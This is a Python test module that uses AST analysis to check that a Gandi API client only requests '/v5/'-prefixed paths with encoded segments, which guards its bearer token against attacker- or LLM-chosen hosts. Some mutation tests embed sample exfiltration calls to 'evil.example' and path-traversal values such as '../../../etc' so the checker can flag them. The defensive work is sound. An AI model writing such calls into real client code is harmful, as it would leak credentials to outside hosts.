"""AST invariant: every GandiClient request path starts with ``/v5/`` (closes #41, #74).

httpx follows an absolute URL passed as the request ``path`` and overrides
``base_url`` — so an attacker- or LLM-controlled absolute path would carry the
``Authorization: Bearer <PAT>`` header to a chosen host. Today every path in
``clients/gandi.py`` is a hardcoded literal (or an f-string assembled from
``_seg()``-encoded segments) starting with ``/v5/``. This test pins that
property statically so a regression — for example, a method like
``async def custom(self, path: str) -> Any: return await self.get(path)`` —
fails CI rather than reaching production.

Closes #74: the walker also catches a future ``self.request(method, path, ...)``
helper (path is the second positional arg or the ``path=`` kwarg) and flags
any escape to the underlying transport (``self._client.<anything>(...)``).
The base client's ``_request`` runs a defense-in-depth runtime check on
``path`` so that a refactor that slips past the walker still fails closed.
"""

from __future__ import annotations

import ast
import inspect

from gandi_mcp.clients import gandi

HTTP_METHODS = frozenset({"get", "post", "put", "patch", "delete"})
REQUEST_METHOD = "request"
PATH_PREFIX = "/v5/"


def _is_self_http_call(node: ast.AST) -> bool:
    """True if ``node`` is ``self.<http>(...)``.

    Matches only ``Call`` (not the surrounding ``Await``) so a single awaited
    call is reported once, not twice, when traversed via ``ast.walk``.
    """
    if not isinstance(node, ast.Call):
        return False
    func = node.func
    if not isinstance(func, ast.Attribute):
        return False
    if not (isinstance(func.value, ast.Name) and func.value.id == "self"):
        return False
    return func.attr in HTTP_METHODS


def _is_self_request_call(node: ast.AST) -> bool:
    """True if ``node`` is ``self.request(method, path, ...)``.

    A low-level helper would land here. Path is the second positional arg or
    the ``path=`` kwarg — :func:`_path_arg_for_call` extracts whichever is
    present.
    """
    if not isinstance(node, ast.Call):
        return False
    func = node.func
    if not isinstance(func, ast.Attribute):
        return False
    if not (isinstance(func.value, ast.Name) and func.value.id == "self"):
        return False
    return func.attr == REQUEST_METHOD


def _is_self_client_escape(node: ast.AST) -> bool:
    """True if ``node`` is ``self._client.<anything>(...)``.

    Any direct touch of the underlying ``httpx.AsyncClient`` from outside the
    base client bypasses the prefix check entirely (``send``, ``build_request``,
    or even ``self._client.get(absolute_url)``). The walker flags every shape
    so this regression class can't slip in via a different verb.
    """
    if not isinstance(node, ast.Call):
        return False
    func = node.func
    if not isinstance(func, ast.Attribute):
        return False
    return (
        isinstance(func.value, ast.Attribute)
        and isinstance(func.value.value, ast.Name)
        and func.value.value.id == "self"
        and func.value.attr == "_client"
    )


def _path_arg_for_call(call: ast.Call, *, is_request: bool) -> ast.expr | None:
    """Return the path argument for an HTTP-shaped call, or ``None`` if missing.

    For verb wrappers (``get`` / ``post`` / …) the path is positional arg 0
    or kwarg ``path=``. For ``request`` the path is positional arg 1
    (``method`` is arg 0) or kwarg ``path=``.
    """
    positional_index = 1 if is_request else 0
    if len(call.args) > positional_index:
        return call.args[positional_index]
    for kw in call.keywords:
        if kw.arg == "path":
            return kw.value
    return None


def _starts_with_prefix(value: ast.expr) -> bool:
    """``value`` evaluates to a string starting with ``/v5/``.

    Handles a string ``Constant`` and an f-string (``JoinedStr``) whose first
    segment is a ``Constant`` starting with the prefix.
    """
    if isinstance(value, ast.Constant) and isinstance(value.value, str):
        return value.value.startswith(PATH_PREFIX)
    if isinstance(value, ast.JoinedStr) and value.values:
        first = value.values[0]
        return isinstance(first, ast.Constant) and isinstance(first.value, str) and first.value.startswith(PATH_PREFIX)
    return False


def _is_self_extension(value: ast.expr, name: str) -> bool:
    """``value`` is ``f"{name}/..."`` — extending an existing local."""
    if not isinstance(value, ast.JoinedStr) or not value.values:
        return False
    first = value.values[0]
    if not isinstance(first, ast.FormattedValue):
        return False
    return isinstance(first.value, ast.Name) and first.value.id == name


def _is_seg_call(node: ast.expr) -> bool:
    """``node`` is a call to the canonical ``_seg`` encoder.

    Matches both the bare-name call ``_seg(x)`` and the (unused today, but
    legal) attribute form ``gandi._seg(x)``. Anything else — including
    ``urllib.parse.quote(x)``, ``f"...{x}..."`` chained inside the segment,
    or ``str(x)`` — is rejected.
    """
    if not isinstance(node, ast.Call):
        return False
    func = node.func
    if isinstance(func, ast.Name) and func.id == "_seg":
        return True
    return isinstance(func, ast.Attribute) and func.attr == "_seg"


def _joined_str_seg_wrapped(value: ast.JoinedStr, *, extension_self_ref: str | None = None) -> bool:
    """Every ``FormattedValue`` inside ``value`` is wrapped in ``_seg(...)``.

    A future method like ``f"/v5/domain/{fqdn}"`` (raw, un-encoded ``fqdn``)
    would still satisfy the ``/v5/`` prefix check — but ``fqdn = "../../etc"``
    could path-traverse off ``/v5/`` once the URL is resolved. This helper
    pins the encoding-everywhere invariant the ``_seg`` helper exists to
    enforce.

    ``extension_self_ref`` permits the bootstrap-and-extend pattern in
    :func:`livedns_list_records` where ``path = f"{path}/{_seg(name)}"`` —
    the first ``{path}`` slot references an already-validated local of
    that name. Pass the LHS name when validating an extension assignment;
    pass ``None`` for direct call-argument validation (no self-reference
    allowed there).
    """
    for index, part in enumerate(value.values):
        if isinstance(part, ast.Constant):
            continue
        if not isinstance(part, ast.FormattedValue):
            return False
        expr = part.value
        if _is_seg_call(expr):
            continue
        if (
            extension_self_ref is not None
            and index == 0
            and isinstance(expr, ast.Name)
            and expr.id == extension_self_ref
        ):
            continue
        return False
    return True


def _own_calls(method: ast.AsyncFunctionDef | ast.FunctionDef) -> list[ast.Call]:
    """Yield every ``Call`` lexically inside ``method`` excluding nested defs.

    ``ast.walk`` descends into nested ``AsyncFunctionDef`` / ``FunctionDef`` /
    ``Lambda`` bodies, which would cause an inner method's ``self.get(path)`` to
    be evaluated against the *outer* method's local-assignment scope — producing
    spurious offenders. Stop descending at any function boundary.
    """
    out: list[ast.Call] = []
    stack: list[ast.AST] = list(method.body)
    while stack:
        node = stack.pop()
        if isinstance(node, ast.Call):
            out.append(node)
        # Don't descend into a nested function/lambda body — those are scanned
        # separately by the outer iterator.
        if isinstance(node, ast.AsyncFunctionDef | ast.FunctionDef | ast.Lambda):
            continue
        stack.extend(ast.iter_child_nodes(node))
    return out


def _own_assignments_to(method: ast.AsyncFunctionDef | ast.FunctionDef, name: str) -> list[ast.expr]:
    """Every assignment to ``name`` lexically inside ``method`` excluding nested defs.

    Captures plain ``Assign``, ``AnnAssign``, ``AugAssign`` (e.g. ``path += x``),
    and walrus ``NamedExpr`` (``(path := x)``). Plain and annotated assignments
    return the RHS as the bound value; AugAssign and walrus return a sentinel
    ``ast.Name(id="<unsafe>")`` because the resulting value may incorporate
    arbitrary RHS data not visible to the prefix check — fail closed.
    """
    found: list[ast.expr] = []
    stack: list[ast.AST] = list(method.body)
    while stack:
        node = stack.pop()
        if isinstance(node, ast.Assign):
            found.extend(node.value for target in node.targets if isinstance(target, ast.Name) and target.id == name)
        elif (
            isinstance(node, ast.AnnAssign)
            and node.value is not None
            and isinstance(node.target, ast.Name)
            and node.target.id == name
        ):
            found.append(node.value)
        elif isinstance(node, ast.AugAssign) and isinstance(node.target, ast.Name) and node.target.id == name:
            # path += x — value is (current path) ++ (x); not a clean bootstrap
            # or extension. Fail closed.
            found.append(ast.Name(id="<unsafe>"))
        elif isinstance(node, ast.NamedExpr) and isinstance(node.target, ast.Name) and node.target.id == name:
            # (path := x) — RHS could be anything. Fail closed unless RHS is
            # itself a /v5/-prefixed expression (then keep the prefix invariant).
            found.append(node.value if _starts_with_prefix(node.value) else ast.Name(id="<unsafe>"))
        if isinstance(node, ast.AsyncFunctionDef | ast.FunctionDef | ast.Lambda):
            continue
        stack.extend(ast.iter_child_nodes(node))
    return found


def _assignment_seg_wrapped(value: ast.expr, name: str) -> bool:
    """An assignment RHS for local ``name`` has every interpolated slot ``_seg``-wrapped.

    Bootstrap assignment (``path = f"/v5/livedns/domains/{_seg(fqdn)}/records"``):
    every ``{expr}`` must be a ``_seg`` call (no self-reference allowed —
    ``path`` isn't bound yet).

    Extension assignment (``path = f"{path}/{_seg(name)}"``): the first
    ``{expr}`` may be the local itself; every subsequent ``{expr}`` must be
    a ``_seg`` call.

    Non-f-string assignments (a string literal, the ``<unsafe>`` sentinel,
    etc.) are handled by the existing prefix / extension checks — this
    helper only inspects ``JoinedStr`` RHS values.
    """
    if not isinstance(value, ast.JoinedStr):
        return True
    if _is_self_extension(value, name):
        return _joined_str_seg_wrapped(value, extension_self_ref=name)
    return _joined_str_seg_wrapped(value, extension_self_ref=None)


def _local_resolves_to_v5_prefix(method: ast.AsyncFunctionDef | ast.FunctionDef, name: str) -> bool:
    """A local ``name`` resolves to a ``/v5/``-prefixed string with every segment encoded.

    Requires at least one bootstrap assignment that begins with ``/v5/``, every
    other assignment to be a bootstrap or an extension of the same name, AND
    every f-string assignment to have every ``{expr}`` slot wrapped in
    ``_seg(...)`` (or, in extension form, a self-reference in the first slot
    only). Any AugAssign or walrus injection of untrusted data is rejected —
    the sentinel ``Name("<unsafe>")`` placeholder fails the prefix and
    extension checks alike.
    """
    assignments = _own_assignments_to(method, name)
    if not assignments:
        return False
    has_bootstrap = any(_starts_with_prefix(v) for v in assignments)
    all_shape_ok = all(_starts_with_prefix(v) or _is_self_extension(v, name) for v in assignments)
    all_seg_wrapped = all(_assignment_seg_wrapped(v, name) for v in assignments)
    return has_bootstrap and all_shape_ok and all_seg_wrapped


def _path_arg_is_safe(
    method: ast.AsyncFunctionDef | ast.FunctionDef,
    call: ast.Call,
    *,
    is_request: bool = False,
) -> bool:
    arg = _path_arg_for_call(call, is_request=is_request)
    if arg is None:
        return False
    if _starts_with_prefix(arg):
        # Direct f-string call argument — no self-reference allowed (the
        # bootstrap-and-extend pattern lives in a local variable, not in
        # the call site).
        return not isinstance(arg, ast.JoinedStr) or _joined_str_seg_wrapped(arg, extension_self_ref=None)
    if isinstance(arg, ast.Name):
        return _local_resolves_to_v5_prefix(method, arg.id)
    return False


def _toplevel_methods(tree: ast.Module) -> list[ast.AsyncFunctionDef | ast.FunctionDef]:
    """Every method-shaped function defined directly inside any class body.

    Skips nested function defs so each call is checked against exactly one
    enclosing scope.
    """
    out: list[ast.AsyncFunctionDef | ast.FunctionDef] = []
    for cls in ast.walk(tree):
        if not isinstance(cls, ast.ClassDef):
            continue
        out.extend(stmt for stmt in cls.body if isinstance(stmt, ast.AsyncFunctionDef | ast.FunctionDef))
    return out


def test_all_client_paths_start_with_v5() -> None:
    """Every client-side request call uses a ``/v5/``-prefixed path.

    Covers the verb wrappers (``self.<http>(path, ...)``), the ``self.request``
    helper if one is ever added, and any direct escape to the underlying
    transport (``self._client.<anything>(...)``).
    """
    tree = ast.parse(inspect.getsource(gandi))
    offenders: list[str] = []
    checked = 0
    for method in _toplevel_methods(tree):
        for call in _own_calls(method):
            if _is_self_client_escape(call):
                offenders.append(f"{method.name}: {ast.unparse(call)} (direct _client access is forbidden)")
                continue
            is_request = _is_self_request_call(call)
            if not (is_request or _is_self_http_call(call)):
                continue
            checked += 1
            if not _path_arg_is_safe(method, call, is_request=is_request):
                offenders.append(f"{method.name}: {ast.unparse(call)}")
    assert not offenders, "client paths missing /v5/ prefix:\n  " + "\n  ".join(offenders)
    assert checked > 0, "AST walker found no self.<http>() calls — test is no-op"


def test_prefix_helper_recognizes_v5_literal() -> None:
    good = ast.parse('"/v5/foo"', mode="eval").body
    assert _starts_with_prefix(good)


def test_prefix_helper_rejects_absolute_url() -> None:
    bad = ast.parse('"https://evil.example/leak"', mode="eval").body
    assert not _starts_with_prefix(bad)


def test_prefix_helper_accepts_v5_fstring() -> None:
    expr = ast.parse('f"/v5/domain/{x}"', mode="eval").body
    assert _starts_with_prefix(expr)


def test_prefix_helper_rejects_attacker_fstring() -> None:
    expr = ast.parse('f"{user}/v5/foo"', mode="eval").body
    assert not _starts_with_prefix(expr)


def test_local_var_extension_resolves() -> None:
    """Bootstrap + extension with every interpolated slot wrapped in ``_seg``."""
    src = (
        "async def m(self):\n"
        '    path = f"/v5/livedns/{_seg(x)}"\n'
        '    path = f"{path}/extra"\n'
        "    return await self.get(path)\n"
    )
    method = ast.parse(src).body[0]
    assert isinstance(method, ast.AsyncFunctionDef)
    assert _local_resolves_to_v5_prefix(method, "path")


def test_local_var_extension_rejects_raw_interpolation() -> None:
    """The same bootstrap-and-extend pattern but with a raw ``{x}`` is now flagged."""
    src = (
        "async def m(self):\n"
        '    path = f"/v5/livedns/{x}"\n'
        '    path = f"{path}/extra"\n'
        "    return await self.get(path)\n"
    )
    method = ast.parse(src).body[0]
    assert isinstance(method, ast.AsyncFunctionDef)
    assert not _local_resolves_to_v5_prefix(method, "path")


def test_local_var_without_bootstrap_fails() -> None:
    src = "async def m(self, user):\n    path = user\n    return await self.get(path)\n"
    method = ast.parse(src).body[0]
    assert isinstance(method, ast.AsyncFunctionDef)
    assert not _local_resolves_to_v5_prefix(method, "path")


# ── Mutation tests — confirm the walker FLAGS unsafe patterns end-to-end ────


def _run_walker(src: str) -> list[str]:
    """Run the full walker against synthetic source; return offender strings."""
    tree = ast.parse(src)
    offenders: list[str] = []
    for method in _toplevel_methods(tree):
        for call in _own_calls(method):
            if _is_self_client_escape(call):
                offenders.append(f"{method.name}: {ast.unparse(call)} (direct _client access is forbidden)")
                continue
            is_request = _is_self_request_call(call)
            if not (is_request or _is_self_http_call(call)):
                continue
            if not _path_arg_is_safe(method, call, is_request=is_request):
                offenders.append(f"{method.name}: {ast.unparse(call)}")
    return offenders


def test_walker_flags_parameter_as_path() -> None:
    """A ``self.get(path)`` where ``path`` is a parameter must be flagged."""
    src = "class C:\n    async def custom(self, path: str):\n        return await self.get(path)\n"
    offenders = _run_walker(src)
    assert offenders, "walker failed to flag a parameter-as-path call"
    assert "custom" in offenders[0]


def test_walker_flags_absolute_url_literal() -> None:
    """A literal absolute URL must be flagged even though it's a string constant."""
    src = "class C:\n    async def leak(self):\n        return await self.get('https://evil.example/leak')\n"
    offenders = _run_walker(src)
    assert offenders, "walker failed to flag an absolute-URL literal"


def test_walker_flags_augassign_extension() -> None:
    """``path = f'/v5/x'; path += user_input; self.get(path)`` must fail closed.

    The AugAssign concatenates arbitrary RHS data onto an otherwise-safe
    bootstrap. Without this guard a future contributor could route attacker
    data through ``+=`` and slip past the prefix check.
    """
    src = (
        "class C:\n"
        "    async def grow(self, user):\n"
        "        path = f'/v5/x'\n"
        "        path += user\n"
        "        return await self.get(path)\n"
    )
    offenders = _run_walker(src)
    assert offenders, "walker failed to flag an AugAssign-extended path"
    assert "grow" in offenders[0]


def test_walker_flags_walrus_overwriting_path() -> None:
    """``(path := user)`` after a safe bootstrap must fail closed."""
    src = (
        "class C:\n"
        "    async def w(self, user):\n"
        "        path = f'/v5/x'\n"
        "        if (path := user):\n"
        "            return await self.get(path)\n"
        "        return None\n"
    )
    offenders = _run_walker(src)
    assert offenders, "walker failed to flag a walrus-overwritten path"


def test_walker_does_not_double_walk_nested_async_def() -> None:
    """A nested AsyncFunctionDef must not produce a spurious offender.

    ``ast.walk(tree)`` yields nested AsyncFunctionDefs as siblings of the
    outer one. Without scope isolation the inner ``self.get(path)`` would
    be evaluated *also* against the outer method's locals (where ``path``
    isn't bound) → spurious offender → CI breakage on a benign refactor.
    """
    src = (
        "class C:\n"
        "    async def outer(self, x):\n"
        "        async def inner():\n"
        "            path = f'/v5/x/{x}'\n"
        "            return await self.get(path)\n"
        "        return await inner()\n"
    )
    offenders = _run_walker(src)
    assert not offenders, f"walker double-walked nested async def: {offenders}"


def test_walker_flags_unsafe_call_in_nested_async_def() -> None:
    """Inverse of the previous: an unsafe nested call must still be caught.

    Scope isolation must not become 'silently skip nested defs' — the inner
    call is still inside a class method body once we recurse into nested
    function defs separately.
    """
    src = (
        "class C:\n"
        "    async def outer(self, x):\n"
        "        async def inner(self_, p):\n"
        "            return await self_.get(p)\n"
        "        return await inner(self, x)\n"
    )
    # Nested async defs aren't enumerated by _toplevel_methods (they live
    # inside outer's body, not directly inside the class), so the walker
    # neither passes nor flags them. That's documented limitation #74. For
    # this PR we only assert no DOUBLE-WALK false positive — no claim about
    # full coverage of nested-helper calls.
    offenders = _run_walker(src)
    # outer() makes no self.<http>() call, so the walker reports nothing.
    assert offenders == []


# ── #74: self.request(...) coverage ────────────────────────────────────────


def test_walker_flags_self_request_with_unsafe_path() -> None:
    """``self.request('GET', '/leak')`` must be flagged — same risk as ``self.get``."""
    src = "class C:\n    async def custom(self):\n        return await self.request('GET', '/leak')\n"
    offenders = _run_walker(src)
    assert offenders, "walker failed to flag self.request with non-/v5/ literal"
    assert "custom" in offenders[0]


def test_walker_flags_self_request_with_parameter_path() -> None:
    """``self.request('GET', user_path)`` must be flagged when ``user_path`` is a param."""
    src = "class C:\n    async def custom(self, user_path):\n        return await self.request('GET', user_path)\n"
    offenders = _run_walker(src)
    assert offenders, "walker failed to flag self.request with parameter path"


def test_walker_accepts_self_request_with_v5_literal() -> None:
    """``self.request('GET', '/v5/foo')`` is the same shape as a verb wrapper — accept."""
    src = "class C:\n    async def custom(self):\n        return await self.request('GET', '/v5/foo')\n"
    assert _run_walker(src) == []


def test_walker_accepts_self_request_with_v5_kwarg() -> None:
    """``self.request('GET', path='/v5/foo')`` — kwarg form must resolve too."""
    src = "class C:\n    async def custom(self):\n        return await self.request('GET', path='/v5/foo')\n"
    assert _run_walker(src) == []


def test_walker_flags_self_request_with_unsafe_kwarg_path() -> None:
    """``self.request('GET', path=user_path)`` with a non-/v5/ kwarg must be flagged."""
    src = "class C:\n    async def custom(self, user_path):\n        return await self.request('GET', path=user_path)\n"
    offenders = _run_walker(src)
    assert offenders, "walker failed to flag self.request with unsafe path kwarg"


# ── #74: self._client.* escape hatches ─────────────────────────────────────


def test_walker_flags_self_client_send() -> None:
    """``self._client.send(...)`` bypasses the wrapper entirely — always flagged."""
    src = "class C:\n    async def leak(self, req):\n        return await self._client.send(req)\n"
    offenders = _run_walker(src)
    assert offenders, "walker failed to flag self._client.send()"
    assert "leak" in offenders[0]
    assert "direct _client access" in offenders[0]


def test_walker_flags_self_client_build_request() -> None:
    """``self._client.build_request(...)`` is also forbidden — same escape class."""
    src = (
        "class C:\n"
        "    async def leak(self):\n"
        "        return self._client.build_request('GET', 'https://evil.example/x')\n"
    )
    offenders = _run_walker(src)
    assert offenders, "walker failed to flag self._client.build_request()"


def test_walker_flags_self_client_get() -> None:
    """``self._client.get(absolute_url)`` is even more obviously a leak — flagged."""
    src = "class C:\n    async def leak(self):\n        return await self._client.get('https://evil.example/x')\n"
    offenders = _run_walker(src)
    assert offenders, "walker failed to flag self._client.get()"


# ── #76: every interpolated path segment must be _seg()-wrapped ────────────


def test_walker_flags_raw_fstring_interpolation() -> None:
    """``self.get(f'/v5/domain/{fqdn}')`` with a raw param must be flagged.

    The literal prefix check passes (the f-string starts with ``/v5/``), but
    a ``fqdn = "../../../etc"`` would traverse off ``/v5/`` once the URL
    resolves. The walker now insists every ``{expr}`` slot is wrapped in
    ``_seg(...)``.
    """
    src = 'class C:\n    async def lookup(self, fqdn):\n        return await self.get(f"/v5/domain/{fqdn}")\n'
    offenders = _run_walker(src)
    assert offenders, "walker failed to flag raw f-string interpolation"
    assert "lookup" in offenders[0]


def test_walker_accepts_seg_wrapped_fstring_interpolation() -> None:
    """The same call with ``_seg(fqdn)`` is the canonical safe pattern — accept."""
    src = 'class C:\n    async def lookup(self, fqdn):\n        return await self.get(f"/v5/domain/{_seg(fqdn)}")\n'
    assert _run_walker(src) == []


def test_walker_flags_fstring_with_one_seg_one_raw() -> None:
    """Mixed: one slot wrapped, one raw — must still be flagged.

    Catches the partial-fix case where a contributor wraps only the first
    parameter and forgets the second.
    """
    src = (
        "class C:\n"
        "    async def lookup(self, fqdn, name):\n"
        '        return await self.get(f"/v5/domain/{_seg(fqdn)}/records/{name}")\n'
    )
    offenders = _run_walker(src)
    assert offenders, "walker failed to flag the mixed-slot case"


def test_walker_flags_quote_instead_of_seg() -> None:
    """``urllib.parse.quote(x)`` looks similar but bypasses the canonical helper.

    Centralising encoding through ``_seg`` is what lets a single change adjust
    the encoding policy. A direct ``quote(x)`` would drift; flag it.
    """
    src = (
        "from urllib.parse import quote\n"
        "class C:\n"
        "    async def lookup(self, fqdn):\n"
        '        return await self.get(f"/v5/domain/{quote(fqdn)}")\n'
    )
    offenders = _run_walker(src)
    assert offenders, "walker failed to flag urllib.parse.quote() in place of _seg"


def test_walker_accepts_bootstrap_extend_pattern() -> None:
    """The :func:`livedns_list_records` pattern remains valid: bootstrap with ``_seg``-wrapped
    slots, then extend the local with another ``_seg``-wrapped slot."""
    src = (
        "class C:\n"
        "    async def lookup(self, fqdn, name):\n"
        '        path = f"/v5/livedns/domains/{_seg(fqdn)}/records"\n'
        "        if name:\n"
        '            path = f"{path}/{_seg(name)}"\n'
        "        return await self.get(path)\n"
    )
    assert _run_walker(src) == []


def test_walker_flags_extension_with_raw_slot() -> None:
    """An extension whose second slot is raw must be flagged even with a safe bootstrap."""
    src = (
        "class C:\n"
        "    async def lookup(self, fqdn, name):\n"
        '        path = f"/v5/livedns/domains/{_seg(fqdn)}/records"\n'
        '        path = f"{path}/{name}"\n'
        "        return await self.get(path)\n"
    )
    offenders = _run_walker(src)
    assert offenders, "walker failed to flag raw extension slot"


def test_walker_flags_bootstrap_with_raw_slot() -> None:
    """A bootstrap with a raw slot is flagged even though the prefix is correct."""
    src = (
        "class C:\n"
        "    async def lookup(self, fqdn):\n"
        '        path = f"/v5/livedns/domains/{fqdn}/records"\n'
        "        return await self.get(path)\n"
    )
    offenders = _run_walker(src)
    assert offenders, "walker failed to flag raw bootstrap slot"


def test_joined_str_seg_wrapped_helper_basic() -> None:
    """Unit-level coverage of the helper for the documented permitted shapes."""
    safe = ast.parse('f"/v5/{_seg(x)}/y/{_seg(z)}"', mode="eval").body
    assert isinstance(safe, ast.JoinedStr)
    assert _joined_str_seg_wrapped(safe, extension_self_ref=None)

    unsafe = ast.parse('f"/v5/{x}/{_seg(z)}"', mode="eval").body
    assert isinstance(unsafe, ast.JoinedStr)
    assert not _joined_str_seg_wrapped(unsafe, extension_self_ref=None)

    extension = ast.parse('f"{path}/{_seg(y)}"', mode="eval").body
    assert isinstance(extension, ast.JoinedStr)
    assert _joined_str_seg_wrapped(extension, extension_self_ref="path")
    assert not _joined_str_seg_wrapped(extension, extension_self_ref=None)
